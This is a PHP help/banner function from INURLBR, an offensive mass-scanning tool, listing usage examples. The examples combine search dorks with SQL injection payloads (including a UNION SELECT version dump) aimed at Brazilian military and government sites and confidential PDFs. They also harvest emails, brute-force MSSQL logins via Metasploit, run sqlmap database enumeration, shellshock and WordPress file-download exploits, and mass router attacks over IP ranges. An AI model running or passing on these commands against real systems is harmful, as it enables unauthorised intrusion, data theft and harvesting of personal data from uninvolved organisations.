<?php

function __info() {

    return __getOut("
 {$_SESSION["c1"]}
   ██▓    ███▄    █      █████▒    ▒█████  
   ▓██▒    ██ ▀█   █    ▓██   ▒    ▒██▒  ██▒
   ▒██▒   ▓██  ▀█ ██▒   ▒████ ░    ▒██░  ██▒
   ░██░   ▓██▒  ▐▌██▒   ░▓█▒  ░    ▒██   ██░
   ░██░   ▒██░   ▓██░   ░▒█░       ░ ████▓▒░
   ░▓     ░ ▒░   ▒ ▒     ▒ ░       ░ ▒░▒░▒░ 
   ▒ ░   ░ ░░   ░ ▒░    ░           ░ ▒ ▒░ 
   ▒ ░      ░   ░ ░     ░ ░       ░ ░ ░ ▒  
   ░              ░                   ░ ░  

   
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}SCRIPT NAME: INURLBR {$_SESSION['config']['version_script']}
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Nick:     MrCl0wnLab
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Email:    mrcl0wnlab\@\gmail.com 
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Blog:     blog.mrcl0wn.com
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Twitter:  twitter.com/MrCl0wnLab
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}GIT:      github.com/MrCl0wnLab
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}PSS:      packetstormsecurity.com/user/mrcl0wnlab
{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Version:  {$_SESSION['config']['version_script']} 
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
    

{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
 

{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}

{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} PHP Version         7
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} php7-curl           LIB
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} php7-cli            LIB   
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} cURL support        enabled
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} URL Information     7.24.0
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} allow_url_fopen     On
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} permission          Reading & Writing
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} User                root privilege, or is in the sudoers group
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} Operating system    LINUX
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]} Proxy random        TOR 
                
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
 
{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php7-cli php7-curl{$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}

{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}

./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--range {$_SESSION["c2"]}'200.20.10.1,200.20.10.255' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--range-rad {$_SESSION["c2"]}'1500' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} {$_SESSION["c1"]}--pr{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksCGI.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}{$_SESSION["c1"]} --pr --shellshock{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks_Wordpress_revslider.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}'xpls_Arbitrary_File_Download.txt' {$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
  
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}

{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} googleinurl@inurlbr:~$ which php 
         /usr/bin/php{$_SESSION["c0"]} 
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} googleinurl@inurlbr:~/cli$ whereis php
         php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz{$_SESSION["c0"]} 
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]} googleinurl@inurlbr:~/cli$ type -a php 
         php is /usr/bin/php{$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}


");
}